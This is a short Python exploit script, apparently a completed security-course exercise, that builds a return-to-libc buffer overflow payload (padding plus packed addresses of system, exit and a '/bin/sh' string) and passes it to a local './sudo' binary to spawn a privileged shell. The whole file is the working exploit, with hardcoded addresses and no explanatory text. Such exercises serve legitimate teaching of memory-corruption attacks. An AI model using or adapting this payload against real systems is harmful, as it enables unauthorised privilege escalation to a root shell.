import os, sys, struct


PATH_TO_SUDO = './sudo'


def get_arg():
	offset = 66
	system_address = 0xb7c5dda0
	bin_sh_address = 0xb7d7e82b
	exit_address = 0xb7c519d0
	param_exit = '\x42'

	return 'a'*offset + struct.pack('<I', system_address) + struct.pack('<I', exit_address) + struct.pack('<I', bin_sh_address) + param_exit

    #raise NotImplementedError()


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
